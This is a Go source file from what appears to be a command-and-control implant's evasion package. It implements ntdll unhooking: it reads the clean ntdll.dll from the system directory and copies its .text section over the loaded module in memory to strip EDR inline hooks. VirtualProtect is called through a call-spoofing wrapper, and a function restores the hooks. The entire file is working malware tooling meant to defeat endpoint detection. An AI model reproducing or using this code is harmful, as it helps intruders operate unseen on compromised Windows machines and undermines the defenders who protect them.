//go:build ev_unhook && windows && amd64

package evasion

import (
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"syscall"
	"unsafe"

	"tornadoc2/agent/internal/peimg"
	"tornadoc2/agent/internal/spoof"
)

var (
	unhookKernel32  = syscall.NewLazyDLL("kernel32.dll")
	unhookGetModule = unhookKernel32.NewProc("GetModuleHandleW")
	unhookProtect   = unhookKernel32.NewProc("VirtualProtect")
	unhookFlush     = unhookKernel32.NewProc("FlushInstructionCache")
	unhookGetProc   = unhookKernel32.NewProc("GetCurrentProcess")
	unhookGetSysDir = unhookKernel32.NewProc("GetSystemDirectoryW")
)

const (
	unhookPageReadWrite = 0x04
	unhookPageExecRead  = 0x20
)

var (
	unhookMu   sync.Mutex
	unhookOrig []byte
	unhookAt   uintptr
	unhookLen  uintptr
)

func init() {
	unhookFn = Unhook
}

// Unhook overwrites the in-memory .text of ntdll with the
// on-disk copy, discarding userland hooks (EDR inline patches) and
// leaving the export table and data sections untouched.
func Unhook() error {
	unhookMu.Lock()
	defer unhookMu.Unlock()
	if unhookOrig != nil {
		return errors.New("ntdll is already unhooked")
	}
	return unhookApply()
}

// UnhookRevert puts the hooked prologues back.
func UnhookRevert() error {
	unhookMu.Lock()
	defer unhookMu.Unlock()
	if unhookOrig == nil {
		return errors.New("ntdll has not been unhooked")
	}
	if err := unhookWrite(unhookAt, unhookLen, unhookOrig); err != nil {
		return err
	}
	unhookOrig, unhookAt, unhookLen = nil, 0, 0
	return nil
}

func unhookWrite(addr, size uintptr, data []byte) error {
	var old uint32
	r := spoof.Call4(unhookProtect.Addr(), addr, size,
		unhookPageReadWrite, uintptr(unsafe.Pointer(&old)))
	if r == 0 {
		return fmt.Errorf("VirtualProtect failed")
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), size), data)
	var tmp uint32
	_, _, _ = unhookProtect.Call(addr, size, uintptr(old),
		uintptr(unsafe.Pointer(&tmp)))
	proc, _, _ := unhookGetProc.Call()
	_, _, _ = unhookFlush.Call(proc, addr, size)
	return nil
}

func unhookApply() error {
	disk, err := ntdllFromDisk()
	if err != nil {
		return err
	}
	base, err := moduleBase(`ntdll.dll`)
	if err != nil {
		return err
	}
	_, secOff, total, err := peimg.Layout(disk)
	if err != nil {
		return err
	}
	_ = secOff
	hdr := disk[:total]
	textRVA, textSize, err := execText(hdr)
	if err != nil {
		return err
	}
	if err := peimg.CheckText(hdr, textRVA); err != nil {
		return err
	}
	if textSize == 0 || textSize > 16<<20 {
		return fmt.Errorf("implausible .text size %d", textSize)
	}
	rawOff, err := sectionRawOffset(disk, textRVA)
	if err != nil {
		return err
	}
	if rawOff+textSize > uint32(len(disk)) {
		return errors.New("truncated ntdll image")
	}

	target := base + uintptr(textRVA)
	size := uintptr(textSize)
	src := make([]byte, size)
	copy(src, disk[rawOff:rawOff+textSize])
	orig := make([]byte, size)
	copy(orig, unsafe.Slice((*byte)(unsafe.Pointer(target)), size))
	if err := unhookWrite(target, size, src); err != nil {
		return err
	}
	unhookOrig, unhookAt, unhookLen = orig, target, size
	return nil
}

func ntdllFromDisk() ([]byte, error) {
	buf := make([]uint16, 260)
	n, _, e := unhookGetSysDir.Call(uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)))
	if n == 0 || n >= uintptr(len(buf)) {
		return nil, fmt.Errorf("GetSystemDirectory: %v", e)
	}
	path := filepath.Join(syscall.UTF16ToString(buf[:n]), "ntdll.dll")
	return os.ReadFile(path)
}

func moduleBase(name string) (uintptr, error) {
	p, _ := syscall.UTF16PtrFromString(name)
	h, _, e := unhookGetModule.Call(uintptr(unsafe.Pointer(p)))
	if h == 0 {
		return 0, fmt.Errorf("GetModuleHandle(%s): %v", name, e)
	}
	return uintptr(h), nil
}

func peSections(img []byte) ([]byte, []byte, uint32, error) {
	if len(img) < 0x40 || img[0] != 'M' || img[1] != 'Z' {
		return nil, nil, 0, errors.New("not a PE image")
	}
	e_lfanew := binary.LittleEndian.Uint32(img[0x3c:])
	if uint64(e_lfanew)+24 > uint64(len(img)) {
		return nil, nil, 0, errors.New("bad e_lfanew")
	}
	if string(img[e_lfanew:e_lfanew+4]) != "PE\x00\x00" {
		return nil, nil, 0, errors.New("bad PE signature")
	}
	coff := e_lfanew + 4
	nsec := binary.LittleEndian.Uint16(img[coff+2:])
	optSize := binary.LittleEndian.Uint16(img[coff+16:])
	opt := coff + 20
	if uint64(opt)+uint64(optSize) > uint64(len(img)) {
		return nil, nil, 0, errors.New("truncated optional header")
	}
	secTable := opt + uint32(optSize)
	tbl := img[secTable:]
	if uint64(secTable)+uint64(nsec)*40 > uint64(len(img)) {
		return nil, nil, 0, errors.New("truncated section table")
	}
	return tbl, img, uint32(nsec), nil
}

func execText(img []byte) (uint32, uint32, error) {
	off, size, err := peimg.ExecutableSection(img, 16)
	if err != nil {
		return 0, 0, err
	}
	return off, size, nil
}

func sectionRawOffset(img []byte, rva uint32) (uint32, error) {
	tbl, _, nsec, err := peSections(img)
	if err != nil {
		return 0, err
	}
	for i := uint32(0); i < nsec; i++ {
		s := tbl[i*40 : i*40+40]
		va := binary.LittleEndian.Uint32(s[12:])
		vsize := binary.LittleEndian.Uint32(s[16:])
		if rva >= va && rva < va+vsize {
			raw := binary.LittleEndian.Uint32(s[20:])
			return raw + (rva - va), nil
		}
	}
	return 0, errors.New("rva outside sections")
}
